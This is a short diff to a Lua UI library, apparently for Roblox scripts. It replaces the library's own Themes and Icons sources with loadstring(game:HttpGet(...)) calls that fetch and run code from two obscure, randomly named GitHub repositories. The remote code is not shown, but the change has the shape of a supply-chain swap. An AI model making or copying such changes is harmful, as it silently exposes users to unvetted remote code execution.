@@ -14,7 +14,7 @@ local redzLib = {
     Version = "v1.2.2",
     PlaceName = MarketplaceService:GetProductInfo(game.PlaceId).Name
   },
-  Themes = loadstring(game:HttpGet(LibraryRawUrl .. "/Themes.lua"))(),
+  Themes = loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Defjrfnxl/refs/heads/main/VodEn"))(),
   Flags = {},
   Save = {
     Theme = "Default",
@@ -22,10 +22,7 @@ local redzLib = {
     ScrollSize = 160,
     TransparencyHub = 0.1
   },
-  Icons = loadstring(game:HttpGet(LibraryRawUrl .. "/Icons.lua"))() --[[
-    I found this source on fluent but I don't know who created it
-    source -- https://github.com/dawid-scripts/Fluent/blob/master/src/Icons.lua --
-  ]],
+  Icons = loadstring(game:HttpGet("https://raw.githubusercontent.com/IIHUII/Fjjzxda6/refs/heads/main/Icons.lua"))(),
   SaveForTheme = {
     Stroke = {},
     Buttons = {},
